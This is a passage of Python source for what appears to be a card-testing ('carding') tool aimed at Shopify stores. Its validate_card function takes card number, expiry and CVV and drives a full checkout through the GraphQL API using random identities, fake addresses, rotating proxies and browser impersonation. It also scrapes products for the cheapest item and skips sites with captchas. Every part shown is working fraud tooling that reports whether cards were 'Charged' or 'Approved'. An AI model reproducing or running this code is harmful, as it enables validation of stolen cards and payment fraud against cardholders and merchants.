                               "CARD_NOT_SUPPORTED")):
        return "INVALID_CARD"
    if any(k in msg for k in ("LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("CALL_ISSUER", "REFER_TO_ISSUER", "CONTACT_ISSUER")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("DO_NOT_HONOR", "DO NOT HONOR",
                               "GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
                               "NOT_PERMITTED", "SERVICE_NOT_ALLOWED",
                               "TRY_AGAIN_LATER", "LIMIT_EXCEEDED")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
        return "CAPTCHA_REQUIRED"
    return "CARD_DECLINED"


def _parse_gql_errors(errors: list) -> str:
    for err in errors:
        for field in ("code", "nonLocalizedMessage", "localizedMessage",
                      "message", "localizedMessageHtml", "messageUntranslated"):
            raw = str(err.get(field) or "")
            if not raw:
                continue
            norm = _normalize_response(raw)
            if norm != "CARD_DECLINED":
                return norm
            upper = raw.upper()
            if any(k in upper for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION")):
                return "CAPTCHA_REQUIRED"
            if any(k in upper for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT")):
                return "INSUFFICIENT_FUNDS"
            if any(k in upper for k in ("INVALID_CVC", "CVC_FAILURE", "INCORRECT_CVC")):
                return "INVALID_CVC"
            if any(k in upper for k in ("PAYMENT_DECLINED", "CARD_DECLINED",
                                         "CHARGE_DECLINED", "FRAUD",
                                         "DO_NOT_HONOR", "DO NOT HONOR")):
                return "CARD_DECLINED"
            if any(k in upper for k in ("SESSION_EXPIRED", "SESSION_INVALID",
                                         "TOKEN_EXPIRED", "INVALID_SESSION")):
                return "SESSION_EXPIRED"
            if any(k in upper for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED",
                                         "CUSTOMER_DISABLED")):
                return "SITE_REQUIRES_LOGIN"
            if any(k in upper for k in ("OUT_OF_STOCK", "SOLD_OUT",
                                         "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
                return "NO_PRODUCT"
            if any(k in upper for k in ("THROTTLED", "RATE_LIMIT",
                                         "TOO_MANY_REQUESTS", "RETRY_LATER")):
                return "THROTTLED"
    return "GRAPHQL_ERROR"


def _make_session(proxy_str: Optional[str] = None,
                  session: Optional[LoggedSession] = None) -> tuple[LoggedSession, bool]:
    if session is not None:
        return session, False
    proxy = _parse_proxy(proxy_str) if proxy_str else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    return LoggedSession(AsyncSession(
        impersonate=IMPERSONATE, timeout=REQUEST_TIMEOUT, proxies=proxies)), True


# ---------------------------------------------------------------------------
# Circuit breaker + quarantine
# ---------------------------------------------------------------------------
def _is_site_available(hostname: str) -> bool:
    s = _site_stats.get(hostname)
    if not s:
        return True
    return time.time() >= s.get("blacklisted_until", 0)


def _site_usable(hostname: str) -> tuple[bool, str]:
    now = time.time()

    if not _is_site_available(hostname):
        return False, "SITE_ERROR: blacklisted"

    q = _site_quarantine.get(hostname)
    if not q:
        return True, ""

    if now < q.get("throttled_until", 0):
        return False, "THROTTLED"

    if q.get("has_products") is False:
        age = now - q.get("has_products_checked_at", 0)
        if age < NO_PRODUCT_TTL:
            return False, "NO_PRODUCT"

    if q.get("has_captcha") is True:
        age = now - q.get("captcha_checked_at", 0)
        if age < NO_PRODUCT_TTL:
            return False, "CAPTCHA_REQUIRED"

    cp = q.get("cheapest_price")
    cpa = q.get("cheapest_checked_at", 0)
    if cp is not None and cp > HARD_MAX_PRICE and (now - cpa) < NO_PRODUCT_TTL:
        return False, f"PRICE_TOO_HIGH: cheapest ${cp:.2f} > ${HARD_MAX_PRICE:.2f}"

    if q.get("can_create_session") is False:
        age = now - q.get("session_checked_at", 0)
        if age < SESSION_FAIL_TTL:
            return False, "NO_SESSION_TOKEN"

    return True, ""


def _record_site_result(hostname: str, response_code: str) -> None:
    if response_code in PROXY_STOP_CODES:
        return

    s = _site_stats[hostname]
    is_err = response_code in SITE_ERROR_CODES
    s["outcomes"].append(1 if is_err else 0)
    if is_err:
        s["consecutive_errors"] += 1
        s["error_count"] += 1
    else:
        s["consecutive_errors"] = 0
        s["success_count"] += 1

    if (len(s["outcomes"]) >= BLACKLIST_SAMPLES and
        sum(s["outcomes"]) / len(s["outcomes"]) >= BLACKLIST_THRESHOLD):
        s["blacklisted_until"] = time.time() + BLACKLIST_SECONDS
        log.warning("[API] Site blacklisted for %ds: %s (%d/%d errors)",
                    BLACKLIST_SECONDS, hostname,
                    sum(s["outcomes"]), len(s["outcomes"]))

    q = _site_quarantine[hostname]
    q["last_response"] = response_code
    q["last_seen"] = time.time()

    if response_code == "CAPTCHA_REQUIRED":
        q["has_captcha"] = True
        q["captcha_checked_at"] = time.time()
    if response_code == "PRICE_TOO_HIGH":
        q["cheapest_checked_at"] = time.time()
    if response_code == "NO_SESSION_TOKEN":
        q["can_create_session"] = False
        q["session_checked_at"] = time.time()

    if response_code in HARD_DEAD_CODES:
        q["count"] += 1
        if response_code in ("NO_PRODUCT", "NO_PRODUCT_FOUND"):
            q["has_products"] = False
            q["has_products_checked_at"] = time.time()
    elif response_code not in SITE_ERROR_CODES:
        q["last_success_at"] = time.time()
        if response_code in FINAL_CODES:
            q["has_products"] = True
            q["has_products_checked_at"] = time.time()


def _preferred_variant(candidates: list[dict], max_price: float) -> Optional[dict]:
    if not candidates:
        return None
    def _pf(c):
        try:
            return float(c.get("price", "1e9"))
        except (ValueError, TypeError):
            return 1e9
    within = [c for c in candidates if _pf(c) <= max_price]
    above_min = [c for c in within if _pf(c) >= MIN_AMOUNT]
    if above_min:
        return min(above_min, key=_pf)
    if within:
        return min(within, key=_pf)
    return min(candidates, key=_pf)


# ---------------------------------------------------------------------------
# Captcha preflight
# ---------------------------------------------------------------------------
async def _site_has_captcha(base_url: str, session: LoggedSession) -> bool:
    try:
        r = await session.get(
            base_url,
            allow_redirects=True,
            timeout=12,
            headers=_ua_headers(random.choice(USER_AGENTS)),
        )
        if r.status_code in (403, 503):
            body = (r.text or "")[:8000].lower()
            if any(k in body for k in (
                "cf-challenge", "cf-browser-verification",
                "just a moment", "attention required",
                "checking your browser", "ddos protection by cloudflare",
                "enable javascript and cookies to continue",
            )):
                return True
            return False
        if r.status_code != 200:
            return False
        body = (r.text or "")[:8000].lower()
        hard_signals = (
            "<title>just a moment...</title>",
            "<title>attention required! | cloudflare</title>",
            "<title>access denied</title>",
            ">verify you are human<",
            ">please verify you are a human<",
            ">press &amp; hold<",
            ">press and hold<",
            ">checking your browser before accessing<",
            ">please wait while we verify your browser<",
            ">enable javascript and cookies to continue<",
        )
        return any(k in body for k in hard_signals)
    except Exception as ex:
        log.debug("[_site_has_captcha] %s -> %s", base_url, ex)
        return False


# ---------------------------------------------------------------------------
# Session-token preflight
# ---------------------------------------------------------------------------
async def _check_session_creation(
    base_url: str,
    variant_id: str,
    session: LoggedSession,
) -> Optional[bool]:
    if not variant_id:
        return None

    network_error = False
    ua = random.choice(USER_AGENTS)
    base_headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": base_url,
        "Referer": f"{base_url}/",
        "sec-ch-ua": '"Chromium";v="124", "Not_A.Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }

    try:
        await session.get(base_url, headers=_ua_headers(ua),
                          allow_redirects=True, timeout=10)
        await asyncio.sleep(0.15)
    except Exception as ex:
        if _looks_like_proxy_error(str(ex)):
            network_error = True

    cart_ok = False
    for payload, ct in [
        (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
        (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}), "application/json"),
    ]:
        try:
            r = await session.post(
                f"{base_url}/cart/add.js",
                data=payload,
                headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},
                timeout=12,
            )
            if r.status_code == 200:
                cart_ok = True
                break
        except Exception as ex:
            if _looks_like_proxy_error(str(ex)):
                network_error = True
            continue

    if not cart_ok:
        if network_error:
            return None
        return False

    try:
        cr = await session.post(
            f"{base_url}/checkout/",
            allow_redirects=True,
            headers={**base_headers, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
            timeout=15,
        )
        if cr.status_code != 200:
            if network_error:
                return None
            return False
        cu = str(cr.url).lower()
        if "login" in cu or "/account" in cu or "password" in cu:
            return False
    except Exception as ex:
        if _looks_like_proxy_error(str(ex)):
            return None
        return True

    return True


# ---------------------------------------------------------------------------
# Product fetching
# ---------------------------------------------------------------------------
async def _fetch_products(
    base_url: str,
    proxy_str: Optional[str] = None,
    max_price: float = MAX_PRICE,
    session: Optional[LoggedSession] = None,
) -> tuple[Optional[dict], list[dict], Optional[str]]:
    if not base_url.startswith("http"):
        base_url = "https://" + base_url

    hostname = urlparse(base_url).netloc
    now = time.time()

    cached = _cache_get(hostname)
    if cached:
        return cached.get("product"), cached.get("candidates", []), cached.get("err")

    async with _host_locks[hostname]:
        cached = _cache_get(hostname)
        if cached:
            return cached.get("product"), cached.get("candidates", []), cached.get("err")

        own_session = session is None
        if own_session:
            session, _ = _make_session(proxy_str)

        try:
            all_variants: list[dict] = []
            transport_error = False
            urls_to_try = [
                f"{base_url}/products.json?limit=250&sort_by=price-ascending",
                f"{base_url}/products.json?limit=250",
            ]
            for url in urls_to_try:
                try:
                    resp = await session.get(url, allow_redirects=True,
                                             headers=_ua_headers(random.choice(USER_AGENTS)))
                    if resp.status_code == 200:
                        data = orjson.loads(resp.content)
                        products = data.get("products", [])
                        if products:
                            all_variants = products
                            break
                    elif resp.status_code in (429, 430):
                        _cache_write_failure(hostname, "THROTTLED", ttl=THROTTLE_COOLDOWN)
                        _site_quarantine[hostname]["throttled_until"] = time.time() + THROTTLE_COOLDOWN
                        return None, [], "THROTTLED"
                except Exception as ex:
                    if _looks_like_proxy_error(str(ex)):
                        transport_error = True
                    continue

            candidates: list[dict] = []
            cheapest_any: Optional[dict] = None
            cheapest_any_price = float("inf")

            if all_variants:
                for product in all_variants:
                    for variant in product.get("variants", []):
                        try:
                            if variant.get("available", True) is False:
                                continue
                            price = float(variant.get("price") or "0")
                        except (ValueError, TypeError):
                            continue
                        if price <= 0:
                            continue
                        entry = {
                            "site":       base_url,
                            "price":      f"{price:.2f}",
                            "price_f":    price,
                            "variant_id": str(variant["id"]),
                            "title":      product.get("title", "Product"),
                            "handle":     product.get("handle", ""),
                        }
                        if price < cheapest_any_price:
                            cheapest_any_price = price
                            cheapest_any = entry
                        if price <= max_price:
                            candidates.append(entry)

            if transport_error and not all_variants:
                return None, [], "PROXY_ERROR"

            q = _site_quarantine[hostname]
            q["has_products"] = bool(candidates or cheapest_any)
            q["has_products_checked_at"] = time.time()

            if not candidates and cheapest_any is None:
                _cache_write_failure(hostname, "No products found")
                return None, [], "No products found"

            last_cap_check = q.get("captcha_checked_at", 0)
            if (now - last_cap_check) > NO_PRODUCT_TTL:
                captcha = await _site_has_captcha(base_url, session)
                q["has_captcha"] = captcha
                q["captcha_checked_at"] = now
                if captcha:
                    log.warning("[preflight] %s has captcha — skipping site", hostname)

            if q.get("has_captcha") is True:
                _cache_write_failure(hostname, "CAPTCHA_REQUIRED")
                return None, [], "CAPTCHA_REQUIRED"

            if cheapest_any_price != float("inf"):
                q["cheapest_price"] = cheapest_any_price
                q["cheapest_checked_at"] = now
                if cheapest_any_price > HARD_MAX_PRICE:
                    err = f"PRICE_TOO_HIGH: cheapest ${cheapest_any_price:.2f} > ${HARD_MAX_PRICE:.2f}"
                    q["has_products"] = False
                    q["has_products_checked_at"] = now
                    _cache_write_failure(hostname, err)
                    return None, [], err

            if cheapest_any is not None:
                last_st_check = q.get("session_checked_at", 0)
                if (now - last_st_check) > SESSION_FAIL_TTL:
                    can_session = await _check_session_creation(
                        base_url, cheapest_any["variant_id"], session
                    )
                    if can_session is not None:
                        q["can_create_session"] = can_session
                    q["session_checked_at"] = now

                if q.get("can_create_session") is False:
                    _cache_write_failure(hostname, "NO_SESSION_TOKEN")
                    return None, [], "NO_SESSION_TOKEN"

            if not candidates:
                candidates = [cheapest_any]

            best = _preferred_variant(candidates, max_price)
            _cache_write_success(hostname, best, candidates)
            return best, candidates, None

        except (asyncio.TimeoutError, RequestsError) as ex:
            if _looks_like_proxy_error(str(ex)):
                return None, [], "PROXY_ERROR"
            return None, [], "Timeout"
        except Exception as ex:
            if _looks_like_proxy_error(str(ex)):
                return None, [], "PROXY_ERROR"
            return None, [], str(ex)
        finally:
            if own_session:
                res = session.close()
                if asyncio.iscoroutine(res):
                    await res


# ---------------------------------------------------------------------------
# Core checkout validator
# ---------------------------------------------------------------------------
async def validate_card(
    cc:         str,
    month:      str,
    year:       str,
    cvv:        str,
    site_url:   str,
    variant_id: Optional[str] = None,
    proxy_str:  Optional[str] = None,
    max_price:  Optional[float] = None,
) -> dict:
    t0 = time.time()
    gateway = "UNKNOWN"
    price = "0.00"
    currency = "USD"
    product_title = ""
    effective_max_price = max_price if max_price is not None else MAX_PRICE

    site_url = site_url.strip()
    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    hostname = urlparse(ourl).netloc
    ua = _site_ua.get(hostname) or random.choice(USER_AGENTS)

    def _r(response: str, charged: str = "False", approved: str = "False",
           message: Optional[str] = None,
           is_site_error: Optional[bool] = None,
           proxy_dead: bool = False) -> dict:
        code_upper = response.upper()
        if is_site_error is None:
            is_site_error = code_upper not in KNOWN_CARD_RESPONSES
        final_gateway = gateway if gateway and gateway != "UNKNOWN" else "Shopify Payments"
        proxy_status = "Dead" if proxy_dead else "Live"
        return {
            "Response":     response,
            "Message":      message or response,
            "code":         response,
            "decline_code": response,
            "Gateway":      final_gateway,
            "Price":        price,
            "Proxy":        proxy_status,
            "Status":       (not is_site_error),
            "Gate":         final_gateway,
            "CC":           f"{cc}|{month}|{year}|{cvv}",
            "Product":      product_title,
            "Site":         ourl,
            "Charged":      charged,
            "Approved":     approved,
            "Time":         f"{round(time.time() - t0, 2)}s",
            "Retry":        is_site_error,
        }

    usable, reason = _site_usable(hostname)
    if not usable:
        code = reason.split(":")[0].strip() if ":" in reason else reason
        return _r(code, message=reason, is_site_error=True)

    sem = _site_semaphores[hostname]
    session, owned = _make_session(proxy_str)

    async with sem:
        try:
            addr = _pick_address(ourl)
            country_code = addr["countryCode"]
            first, last, email = _random_identity()
            phone = addr["phone"]
            street = addr["address1"]
            city = addr["city"]
            state = addr["zoneCode"]
            s_zip = addr["postalCode"]

            try:
                await session.get(ourl, headers=_ua_headers(ua),
                                  allow_redirects=True, timeout=10)
                await asyncio.sleep(0.2)
            except Exception:
                pass

            cached_v = _variant_cache.get(hostname)
            if (not variant_id and cached_v
                    and (time.time() - cached_v["ts"]) < VARIANT_TTL):
                variant_id = cached_v["variant"]["variant_id"]
                price = cached_v["variant"]["price"]
                product_title = cached_v["variant"].get("title", "")
                all_candidates = [cached_v["variant"]]
            else:
                best, all_candidates, err = await _fetch_products(
                    ourl, proxy_str, max_price=effective_max_price, session=session,
                )
                if not all_candidates and not best:
                    err_str = (err or "No products available")
                    if err_str == "THROTTLED":
                        return _r("THROTTLED", message="Products endpoint rate-limited", is_site_error=True)
                    if err_str == "PROXY_ERROR":
                        return _r("PROXY_ERROR", message="Proxy/network failure during product fetch",
                                  proxy_dead=True, is_site_error=True)
                    if err_str == "CAPTCHA_REQUIRED":
                        return _r("CAPTCHA_REQUIRED", message="Site has captcha (preflight)", is_site_error=True)
                    if err_str == "NO_SESSION_TOKEN":
                        return _r("NO_SESSION_TOKEN", message="Site cannot create session token (preflight)", is_site_error=True)
                    if err_str.startswith("PRICE_TOO_HIGH"):
                        return _r("PRICE_TOO_HIGH", message=err_str, is_site_error=True)
                    return _r(f"NO_PRODUCT: {err_str}", message=err_str, is_site_error=True)

                pick_pool = list(all_candidates) if all_candidates else ([best] if best else [])
                if not pick_pool:
                    return _r(f"NO_PRODUCT: {err or 'No products available'}",
                              message=err or "No products", is_site_error=True)

                if not variant_id:
                    chosen = _preferred_variant(pick_pool, effective_max_price)
                    variant_id = chosen["variant_id"]
                    price = chosen["price"]
                    product_title = chosen.get("title", "")
                    _variant_cache[hostname] = {
                        "variant": {
                            "variant_id": variant_id,
                            "price":      price,
                            "title":      product_title,
                            "price_f":    chosen.get("price_f"),
                            "site":       chosen.get("site"),
                            "handle":     chosen.get("handle", ""),
                        },
                        "ts": time.time(),
                    }
                else:
                    matched = next((c for c in pick_pool if str(c.get("variant_id")) == str(variant_id)), None)
                    if not matched:
                        return _r(f"PRICE_OVER_MAX: variant {variant_id} not available",
                                  message="Variant not found", is_site_error=True)
                    price = matched["price"]
                    product_title = matched.get("title", "")

            base_headers = {
                "User-Agent": ua,
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json",
                "Origin": ourl,
                "Referer": f"{ourl}/",
                "sec-ch-ua": '"Chromium";v="124", "Not_A.Brand";v="24"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
            }

            cart_added = False
            for payload, ct in [
                (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
                (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}), "application/json"),
            ]:
                try:
                    r = await session.post(
                        f"{ourl}/cart/add.js",
                        data=payload,
                        headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},
                    )
                    if r.status_code == 200:
                        cart_added = True
                        break
                except Exception:
                    continue

            if not cart_added:
                try:
                    r = await session.get(f"{ourl}/checkout", allow_redirects=True, headers=_ua_headers(ua))
                    if r.status_code == 200 and "checkouts/cn/" in str(r.url):
                        cart_added = True
                        cr = r
                        checkout_url = str(r.url)
                        page_text = r.text
                    else:
                        return _r("CART_FAILED", message="Could not add to cart", is_site_error=True)
                except Exception as ex:
                    if _looks_like_proxy_error(str(ex)):
                        return _r("PROXY_ERROR", message=str(ex)[:120], proxy_dead=True, is_site_error=True)
                    return _r("CART_FAILED", message="Could not add to cart", is_site_error=True)
            else:
                try:
                    cr = await session.post(
                        f"{ourl}/checkout/",
                        allow_redirects=True,
                        headers={**base_headers, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                    )
                    checkout_url = str(cr.url)
                    page_text = cr.text
                except (asyncio.TimeoutError, RequestsError) as ex:
                    if _looks_like_proxy_error(str(ex)):
                        return _r("PROXY_ERROR", message=str(ex)[:120], proxy_dead=True, is_site_error=True)
                    return _r("TIMEOUT", message="Checkout timed out", is_site_error=True)
                except Exception as ex:
                    if _looks_like_proxy_error(str(ex)):
                        return _r("PROXY_ERROR", message=str(ex)[:120], proxy_dead=True, is_site_error=True)
                    return _r(f"CHECKOUT_FAILED: {type(ex).__name__}", message=str(ex)[:100], is_site_error=True)

            lower_url = checkout_url.lower()
            if "login" in lower_url or "/account" in lower_url:
                return _r("SITE_REQUIRES_LOGIN", message="Store requires login", is_site_error=True)

            early = page_text[:5000].lower()
            if ("enter password" in early or "storefront password" in early
                    or ('name="password"' in early and "login" in lower_url)):
                return _r("SITE_REQUIRES_LOGIN", message="Store is password-protected", is_site_error=True)

            m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
            if m:
                attempt_token = m.group(1)
            else:
                attempt_token = checkout_url.rstrip("/").split("/")[-1].split("?")[0]
            if not attempt_token or len(attempt_token) < 4:
                return _r("NO_ATTEMPT_TOKEN", message="No attempt token in URL", is_site_error=True)

            sst = _extract_sst(page_text, dict(cr.headers))
            if not sst:
                early_lower = page_text[:5000].lower()
                strong_challenge = any(k in early_lower for k in (
                    "<title>just a moment...</title>",
                    "<title>attention required! | cloudflare</title>",
                    ">verify you are human<",
                    ">please verify you are a human<",
                    ">checking your browser before accessing<",
                ))
                if strong_challenge:
                    return _r("CAPTCHA_REQUIRED", message="Cloudflare challenge at checkout", is_site_error=True)
                return _r("NO_SESSION_TOKEN", message="No session token in HTML", is_site_error=True)

            queue_token = (
                _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
                _extract(page_text, '"queueToken":"', '"')
            )
            stable_id = (
                _extract(page_text, 'stableId&quot;:&quot;', "&quot;") or
                _extract(page_text, '"stableId":"', '"') or "1"
            )
            merch_gid = (
                _extract(page_text, "ProductVariantMerchandise/", "&quot;") or
                _extract(page_text, "ProductVariantMerchandise/", '&q') or
                _extract(page_text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                str(variant_id)
            )

            for s, e in [('currencyCode&quot;:&quot;', "&quot;"), ('"currencyCode":"', '"')]:
                val = _extract(page_text, s, e)
                if val and len(val) == 3 and val.isalpha():
                    currency = val.upper()
                    break

            addr = _pick_address(ourl, currency)
            country_code = addr["countryCode"]
            phone = addr["phone"]
            street = addr["address1"]
            city = addr["city"]
            state = addr["zoneCode"]
            s_zip = addr["postalCode"]

            subtotal = (
                _extract(page_text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', "&quot;") or
                _extract(page_text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            )
            if not subtotal:
                m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                subtotal = m2.group(1) if m2 else "0.01"

            unescaped = page_text.replace("&quot;", '"').replace("&amp;", "&")
            build_id = None
            m3 = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if m3:
                build_id = m3.group(1)

            source_token = _extract(page_text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            ident_sig = None
            m4 = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            if m4:
                ident_sig = m4.group(1)

            graphql_url = f"https://{hostname}/checkouts/unstable/graphql"

            gql_headers = {
                **base_headers,
                "shopify-checkout-client":  "checkout-web/1.0",
                "shopify-checkout-source":  f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            if build_id:
                gql_headers["x-checkout-web-build-id"] = build_id
                gql_headers["x-checkout-web-deploy-stage"] = "production"
            if source_token:
                gql_headers["x-checkout-web-source-id"] = source_token

            merch_id_full = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
            variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"

            def _base_vars() -> dict:
                return {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken":   queue_token or "",
                    "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {"partialStreetAddress": {
                                "address1": street, "address2": "", "city": city,
                                "countryCode": country_code, "postalCode": s_zip,
                                "firstName": first, "lastName": last,
                                "zoneCode": state, "phone": phone,
                            }},
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True,
                        }],
                        "noDeliveryRequired": [], "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {"productVariantReference": {
                                "id": merch_id_full, "variantId": variant_id_full,
                                "properties": [], "sellingPlanId": None,
                                "sellingPlanDigest": None,
                            }},
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None, "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True}, "paymentLines": [],
                        "billingAddress": {"streetAddress": {
                            "address1": "", "city": "", "countryCode": country_code,
                            "lastName": "", "zoneCode": state, "phone": "",
                        }},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "memberships": {"memberships": []},
                    "cartMetafields": [],
                }

            ship_vars = _base_vars()
            resp_json: Any = None
            for attempt in range(3):
                try:
                    r = await session.post(graphql_url,
                        params={"operationName": "Proposal"},
                        headers=gql_headers,
                        json={"query": QUERY_PROPOSAL_SHIPPING, "variables": ship_vars,
                              "operationName": "Proposal"})
                    resp_json = orjson.loads(r.content)
                except (orjson.JSONDecodeError, asyncio.TimeoutError, RequestsError) as ex:
                    if _looks_like_proxy_error(str(ex)):
                        return _r("PROXY_ERROR", message=str(ex)[:120], proxy_dead=True, is_site_error=True)
                    if attempt < 2:
                        await asyncio.sleep(1)
                    continue
                data = resp_json.get("data", {}) or {}
                if data.get("session"):
                    break
                gql_errs = resp_json.get("errors", []) or []
                if gql_errs:
                    interpreted = _parse_gql_errors(gql_errs)
                    if interpreted in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
                                       "THROTTLED", "NO_PRODUCT"):
                        return _r(interpreted, message=str(gql_errs[:1])[:120], is_site_error=True)
                    if attempt < 2:
                        await asyncio.sleep(1.5)
                        continue
                    return _r(interpreted if interpreted != "GRAPHQL_ERROR" else "GRAPHQL_ERROR",
                              message=str(gql_errs[:1])[:120], is_site_error=True)

            if not resp_json or not (resp_json.get("data") or {}).get("session"):
                return _r("GRAPHQL_ERROR", message="No session in shipping response", is_site_error=True)

            try:
                _ship_sst = r.headers.get("x-checkout-one-session-token")
                if _ship_sst:
                    sst = _ship_sst
                    gql_headers["x-checkout-one-session-token"] = sst
            except Exception:
                pass

            session_data = resp_json["data"]["session"]
            negotiate = session_data.get("negotiate") or {}
            neg_errors = negotiate.get("errors") or []
            if neg_errors:
                code = _parse_gql_errors(neg_errors)
                if code != "GRAPHQL_ERROR":
                    return _r(code, message=str(neg_errors[:1])[:120], is_site_error=True)

            result_obj = negotiate.get("result") or {}
            result_type = result_obj.get("__typename", "")

            if result_type == "CheckpointDenied":
                return _r("CHECKPOINTDENIED", message="Checkpoint denied", is_site_error=True)
            if result_type in ("Throttled", "TooManyRequests"):
                return _r("THROTTLED", message="Rate limited", is_site_error=True)
            if result_type == "NegotiationResultFailed":
                return _r("NEGOTIATE_FAILED", message="Negotiation failed", is_site_error=True)

            checkpoint_data = result_obj.get("checkpointData")
            seller = result_obj.get("sellerProposal") or {}
            if not seller:
                return _r("NO_SELLER_PROPOSAL", message="No seller proposal", is_site_error=True)

            running_total_data = seller.get("runningTotal") or {}
            running_total = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")

            delivery_data = seller.get("delivery") or {}
            delivery_strategy = ""
            shipping_amount = 0.0
            if delivery_data.get("__typename") == "FilledDeliveryTerms":
                d_lines = delivery_data.get("deliveryLines") or []
                if d_lines:
                    strategies = d_lines[0].get("availableDeliveryStrategies") or []
                    if strategies:
                        delivery_strategy = strategies[0].get("handle", "")
                        try:
                            amt_data = strategies[0].get("amount") or {}
                            shipping_amount = float(
                                amt_data.get("value", {}).get("amount") or amt_data.get("amount") or "0"
                            )
                        except (ValueError, TypeError):
                            shipping_amount = 0.0

            tax_data = seller.get("tax") or {}
            tax_amount = 0.0
            if tax_data.get("__typename") == "FilledTaxTerms":
                try:
                    tax_amt_data = tax_data.get("totalTaxAmount") or {}
                    tax_amount = float(
                        tax_amt_data.get("value", {}).get("amount") or tax_amt_data.get("amount") or "0"
                    )
                except (ValueError, TypeError):
                    pass

            payment_data = seller.get("payment") or {}
            payment_identifier = None
            if payment_data.get("__typename") == "FilledPaymentTerms":
                avail_lines = payment_data.get("availablePaymentLines") or []
                for line in avail_lines:
                    pm = line.get("paymentMethod") or {}
                    pid = pm.get("paymentMethodIdentifier")
                    if pid:
                        detected_gateway = (pm.get("extensibilityDisplayName") or
                                            pm.get("name") or pm.get("brand") or
                                            pm.get("displayName") or "Shopify Payments")
                        if "shopify" in detected_gateway.lower() and "payments" in detected_gateway.lower():
                            payment_identifier = pid
                            gateway = detected_gateway
                            price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                            break

            if not payment_identifier:
                return _r("NO_SHOPIFY_PAYMENTS_GATEWAY",
                          message="Store does not use Shopify Payments", is_site_error=True)

            deliv_vars = copy.deepcopy(ship_vars)
            deliv_vars["sessionInput"]["sessionToken"] = sst
            deliv_vars["delivery"]["deliveryLines"][0].update({
                "destination": {"streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }},
                "selectedDeliveryStrategy": {
